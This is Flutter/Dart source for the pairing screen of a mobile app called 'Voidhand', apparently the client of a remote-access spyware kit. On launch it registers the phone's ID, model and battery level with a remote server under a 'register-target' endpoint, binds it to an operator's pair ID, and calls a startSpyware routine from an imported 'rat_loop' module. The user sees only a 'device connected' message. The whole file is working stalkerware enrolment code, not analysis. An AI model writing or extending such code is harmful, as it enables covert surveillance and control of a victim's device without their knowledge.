import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:battery_plus/battery_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'globals.dart';
import 'rat_loop.dart';

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id,
          "model": model,
          "battery": lv.toString(),
          "status": "Online",
          "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

Future<bool> _pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http.post(
      Uri.parse("$kServerBase/api/pair-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "pairId": pairId,
        "deviceId": globalDeviceId,
        "model": globalDeviceModel,
        "battery": lv.toString(),
      }),
    ).timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('pairId', pairId);
      return true;
    }
  } catch (_) {}
  return false;
}

class PairingHomePage extends StatefulWidget {
  const PairingHomePage({super.key});
  @override State<PairingHomePage> createState() => _PairingHomePageState();
}

class _PairingHomePageState extends State<PairingHomePage> with SingleTickerProviderStateMixin {
  bool _loading = false;
  bool _paired = false;
  String _msg = '';

  late AnimationController _animCtrl;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    _checkAlreadyPaired();

    _animCtrl = AnimationController(duration: const Duration(milliseconds: 1000), vsync: this)..forward();
    _fadeAnim = Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(parent: _animCtrl, curve: Curves.easeOut));
  }

  @override
  void dispose() {
    _animCtrl.dispose();
    super.dispose();
  }

  Future<void> _checkAlreadyPaired() async {
    final prefs = await SharedPreferences.getInstance();
    final p = prefs.getString('pairId');
    if (p != null && p.isNotEmpty) {
      setState(() {
        _paired = true;
        _msg = '✅ Perangkat sudah terhubung';
      });
    } else {
      _doPair();
    }
  }

  Future<void> _doPair() async {
    setState(() {
      _loading = true;
      _msg = 'Menghubungkan…';
    });
    final ok = await _pairDevice(kPairId);

    if (ok) {
      await _registerDevice(globalDeviceId, globalDeviceModel);
      startSpyware(globalDeviceId);
      setState(() {
        _loading = false;
        _paired = true;
        _msg = '✅ Perangkat berhasil terhubung!';
      });
    } else {
      setState(() {
        _loading = false;
        _msg = '❌ Gagal terhubung ke server. Coba lagi.';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      body: Stack(children: [
        Container(decoration: BoxDecoration(gradient: RadialGradient(
          center: const Alignment(0, -0.3), radius: 1.3,
          colors: [const Color(0xFFE0E0E0).withOpacity(0.08), Colors.black.withOpacity(0.88), Colors.black.withOpacity(0.97)],
        ))),
        SafeArea(child: FadeTransition(opacity: _fadeAnim,
          child: Column(children: [
            const Spacer(),

            Container(
              padding: const EdgeInsets.all(4),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: const Color(0xFFE0E0E0).withOpacity(0.7), width: 2),
                boxShadow: [BoxShadow(color: const Color(0xFFE0E0E0).withOpacity(0.3), blurRadius: 25, spreadRadius: 4)],
              ),
              child: ClipOval(child: Image.asset('assets/logo.png', height: 100, width: 100, fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => const Icon(Icons.shield, size: 80, color: Colors.red))),
            ),
            const SizedBox(height: 22),
            const Text('Voidhand', style: TextStyle(
              color: Color(0xFFE0E0E0), fontSize: 26, fontWeight: FontWeight.w900,
              fontFamily: 'Orbitron', letterSpacing: 4,
              shadows: [Shadow(color: Color(0xFFE0E0E0), blurRadius: 10)],
            )),
            const SizedBox(height: 6),
            Text(_paired ? 'Perangkat Terhubung' : 'Menghubungkan Perangkat...',
                style: TextStyle(color: _paired ? Colors.greenAccent : Colors.white60,
                    fontSize: 13, fontFamily: 'ShareTechMono', letterSpacing: 1.5)),

            const Spacer(),

            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: const Color(0xFF0F0F0F).withOpacity(0.88),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: (_paired ? Colors.greenAccent : const Color(0xFFE0E0E0)).withOpacity(0.2), width: 1.5),
                  boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 15)],
                ),
                child: Column(children: [
                  if (_paired) ...[
                    const Icon(Icons.check_circle_rounded, color: Colors.greenAccent, size: 50),
                    const SizedBox(height: 12),
                    const Text('Perangkat sudah terhubung\nke akun utama',
                        style: TextStyle(color: Colors.greenAccent, fontSize: 13, fontFamily: 'ShareTechMono', height: 1.6),
                        textAlign: TextAlign.center),
                  ] else ...[
                    const Text('Menunggu koneksi...',
                        style: TextStyle(color: Colors.white38, fontSize: 12, fontFamily: 'ShareTechMono')),
                    const SizedBox(height: 16),
                    if (_msg.isNotEmpty)
                      Padding(
                        padding: const EdgeInsets.only(bottom: 14),
                        child: Text(_msg, style: TextStyle(
                          color: _msg.startsWith('✅') ? Colors.greenAccent
                              : _msg.startsWith('❌') ? Colors.redAccent : Colors.white54,
                          fontSize: 12, fontFamily: 'ShareTechMono',
                        ), textAlign: TextAlign.center),
                      ),
                    if (_loading)
                       const CircularProgressIndicator(color: Colors.grey),
                  ],
                ]),
              ),
            ),

            const Spacer(),
            const Padding(
              padding: EdgeInsets.only(bottom: 24),
              child: Text('ID didapat dari pemilik akun • 1x hubung selamanya',
                  style: TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'ShareTechMono'),
                  textAlign: TextAlign.center),
            ),
          ]),
        )),
      ]),
    );
  }
}
